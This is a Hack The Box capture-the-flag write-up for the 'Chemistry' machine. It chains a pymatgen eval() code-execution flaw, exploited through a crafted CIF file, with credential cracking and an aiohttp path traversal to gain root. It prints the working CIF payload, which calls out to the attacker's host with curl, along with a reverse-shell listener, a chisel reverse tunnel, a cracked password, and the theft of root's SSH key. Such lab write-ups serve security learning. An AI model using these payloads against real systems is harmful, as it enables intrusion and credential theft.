---
layout: post
title:  "Hack The Box: Chemistry Write-Up"
category : writeup
tags :  easy CIF rce chisel
---

Machine Author(s): [FistMatHAck](https://app.hackthebox.com/users/1076236)

## Description:

This machine is a Easy linux machine, The machine is exploited by taking advantage of a vulnerability in the `pymatgen` library, where the `JonesFaithfulTransformation.from_transformation_str()` method improperly uses `eval()`, allowing code execution through a crafted CIF file. This leads to initial access, from which the attacker retrieves a database containing the user `rosa`'s password hash. Following this, an LFI vulnerability is exploited to obtain the SSH private key (`id_rsa`) of the root user, ultimately granting full root access to the system.

#### Difficulty: `easy`

# Part 1: Enumeration & Foothold

## Enumeration

- Nmap finds two open TCP ports, SSH (22) and UPNP (5000)

```bash
[🔴][Oct 20, 2024 - 20:21:24 (CEST)] exegol-htb chemistry # sudo nmap -sSCV -p- "10.129.124.136"
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-20 20:22 CEST
Nmap scan report for 10.129.124.136
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6fc20ae9d1d451d0bced9d020f26fdc (RSA)
|   256 f1ae1c3e1dea55446c2ff2568d623c2b (ECDSA)
|_  256 94421b78f25187073e9726c9a25c0a26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sun, 20 Oct 2024 18:22:42 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

## Foothold

### Website TCP 5000

- Site
![site](/assets/blog/htb-chemistry/site_img.png)

- There’s not much here without a login, but I can register an account and login:
- We saw that we can upload a cif file

![dashboard](/assets/blog/htb-chemistry/dashboard.png)

- Trying to do some file upload bypass did not give anything correct, but there is an example cif file format we can download on the path /static/example.cif
- From there I stumbled upon a vulnerable python lib used using a simple google search. We came across a critical security vulnerability in the `JonesFaithfulTransformation.from_transformation_str()` method within the `pymatgen` library. This method insecurely utilizes eval() for processing input, enabling execution of arbitrary code when parsing untrusted input. This can be exploited when parsing a maliciously-created CIF file.
- From there we created the vulnerable file and uploaded it to the server:

```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"] ) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl 10.10.14.176");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

- In this exploit, we make a curl to our webserver to check if there is a callback from the server:
![exploit1](/assets/blog/htb-chemistry/exploit1.png)

- Upon trying to view the document, we observe an internal server error. Checking my webserver i received a callback hence code execution on this machine:

![web_callback](/assets/blog/htb-chemistry/web_callback.png)

### Shell as app

- We created 3 CIF files containing a stager, a file that made the shell.sh executable, and the third file that executes the shell.sh:

```bash
[🔴][Oct 20, 2024 - 20:57:39 (CEST)] exegol-htb chemistry # rlwrap -cAr nc -lvnp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

Ncat: Connection from 10.129.124.136.
Ncat: Connection from 10.129.124.136:34542.
bash: cannot set terminal process group (1052): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$
app@chemistry:~$
app@chemistry:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
app@chemistry:~$ ls
ls
app.py  instance  shell.sh  static  templates  uploads
app@chemistry:~$
```

# Part 2: Lateral Movement & Privilege Escalation

## Lateral Movement

- After we obtained our rev shell, a quick search through the file directories revealed a database.db file. Downloading the file showed it contained credentials:

![dashboard_db](/assets/blog/htb-chemistry/dashboard_db.png)

![db_content](/assets/blog/htb-chemistry/db_content.png)

- Collected all the hashes and cracked them with CrackStation for simplicity. From there, we got a valid user called rosa with her password `unicorniosrosados`, and we retrieved the user flag:

![rosa_ssh](/assets/blog/htb-chemistry/rosa_ssh.png)
## Privilege Escalation

### Shell as rosa

- Running `netstat -a` reveals port 8080:

```bash
rosa@chemistry:~$ netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN
tcp        0      0 localhost:http-alt      0.0.0.0:*               LISTEN
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
tcp        0      1 10.129.124.136:33764    8.8.8.8:domain          SYN_SENT
```


- I’ll connect from the chemistry box, tunneling port 8001 on
- I use `-p 8000` to listen on 8000 (the default port of 8080 is already in use by Burp), and give it `--reverse` to allow incoming connections to open listeners on my host that tunnel back through them.

```bash
[🔴][Oct 20, 2024 - 18:02:35 (CEST)] exegol-htb chemistry # chisel   server -p 8000 --reverse
2024/10/20 18:04:08 server: Reverse tunnelling enabled
2024/10/20 18:04:08 server: Fingerprint etiZL+Qj2dflGx8xX/U+z6vvE6Q3aiq2SWQi2PAws1g=
2024/10/20 18:04:08 server: Listening on http://0.0.0.0:8000
2024/10/20 18:07:13 server: session#1: tun: proxy#R:8001=>8080: Listening

```

- I’ll connect from chemistry box, tunneling port 8001 on my host through the tunnel to 8000 on chemistry:

```bash
rosa@chemistry:~$ ./chisel client 10.10.14.176:8000 R:8001:127.0.0.1:8080 &
[2] 2105
rosa@chemistry:~$ 2024/10/20 19:33:09 client: Connecting to ws://10.10.14.176:8000
2024/10/20 19:33:09 client: Connected (Latency 37.877078ms)
```

Site
- Visiting the website on [`http://127.0.0.1:8001`](http://127.0.0.1:8001) shows another website

![internal_service](/assets/blog/htb-chemistry/internal_service.png)

- Fuzzing through the web directories we observe that the assets directory is present but forbidden
- From here using burp we actually notice the server is a pyhton3,9 aiohttp/3.9.1

![aiohttp](/assets/blog/htb-chemistry/aiohttp.png)

- This aio http server version is actually vulnerable to PAth traversal vulnerability,

The root cause of this vulnerability lies in the way aiohttp handles static file serving when follow_symlinks is enabled. This setting allows aiohttp to follow symbolic links (symlinks) during file serving, which can be exploited by attackers to navigate to arbitrary locations on the system.

![symlinks](/assets/blog/htb-chemistry/symlinks.png)

- This confirms the vulnerability from here checking through files we could read the root flag

![root_flag](/assets/blog/htb-chemistry/root_flag.png)

### Shell as root
- Furthermore to get access to the machine we used the same method to get the root id_rsa private key file and could connect through ssh and finally as root

```bash
[🔴][Oct 20, 2024 - 22:08:44 (CEST)] exegol-htb chemistry # ssh root@10.129.124.136 -i id_rsa
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 20 Oct 2024 08:08:59 PM UTC

  System load:           0.0
  Usage of /:            73.0% of 5.08GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             236
  Users logged in:       1
  IPv4 address for eth0: 10.129.124.136
  IPv6 address for eth0: dead:beef::250:56ff:fe94:d0b2

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Oct 11 14:06:59 2024
root@chemistry:~# id
uid=0(root) gid=0(root) groups=0(root)
root@chemistry:~#
```

## Conclusion

This machine highlights vulnerabilities in library usage (eval in pymatgen), local file inclusions, and symlink handling in web servers. Proper coding practices, such as avoiding eval() and securing static file serving, could have mitigated these vulnerabilities.